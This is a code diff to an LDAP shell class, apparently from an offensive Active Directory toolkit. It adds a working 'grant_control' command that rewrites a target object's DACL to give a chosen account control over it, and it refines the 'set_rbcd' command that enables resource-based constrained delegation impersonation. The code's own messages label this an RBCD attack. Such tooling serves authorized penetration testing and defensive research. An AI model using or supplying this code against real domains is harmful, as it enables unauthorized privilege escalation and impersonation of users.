@@ -313,11 +313,58 @@ class LdapShell(cmd.Cmd):
 
         self.search('(memberof:%s:=%s)' % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(group_dn)), "sAMAccountName", "name")
 
+    def do_grant_control(self, line):
+        args = shlex.split(line)
+
+        if len(args) != 1 and len(args) != 2:
+            raise Exception("Error expecting target and grantee names for RBCD attack. Recieved %d arguments instead." % len(args))
+
+        controls = security_descriptor_control(sdflags=0x04)
+
+        target_name = args[0]
+        grantee_name = args[1]
+
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+        target_sid = target["objectSid"].value
+        print("Found Target DN: %s" % target.entry_dn)
+        print("Target SID: %s\n" % target_sid)
+
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        grantee = self.client.entries[0]
+        grantee_sid = grantee["objectSid"].value
+        print("Found Grantee DN: %s" % grantee.entry_dn)
+        print("Grantee SID: %s" % grantee_sid)
+
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
+        except IndexError:
+            sd = self.create_empty_sd()
+
+        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
+        self.client.modify(target.entry_dn, {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
+        if self.client.result['result'] == 0:
+            print('DACL modified successfully!')
+            print('%s now has control of %s' % (grantee_name, target_name))
+        else:
+            if self.client.result['result'] == 50:
+                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+            elif self.client.result['result'] == 19:
+                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            else:
+                raise Exception('The server returned an error: %s', self.client.result['message'])
+
     def do_set_rbcd(self, line):
         args = shlex.split(line)
 
         if len(args) != 1 and len(args) != 2:
-            raise Exception("Error expecting target and grantee sids for RBCD attack. Recieved %d arguments instead." % len(args))
+            raise Exception("Error expecting target and grantee names for RBCD attack. Recieved %d arguments instead." % len(args))
 
         target_name = args[0]
         grantee_name = args[1]
@@ -348,13 +395,18 @@ class LdapShell(cmd.Cmd):
             print('Currently allowed sids:')
             for ace in sd['Dacl'].aces:
                 print('    %s' % ace['Ace']['Sid'].formatCanonical())
+
+                if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
+                    print("Grantee is already permitted to perform delegation to the target host")
+                    return
+
         except IndexError:
             sd = self.create_empty_sd()
 
         sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
         self.client.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
         if self.client.result['result'] == 0:
-            print('Delegation rights modified succesfully!')
+            print('Delegation rights modified successfully!')
             print('%s can now impersonate users on %s via S4U2Proxy' % (grantee_name, target_name))
         else:
             if self.client.result['result'] == 50:
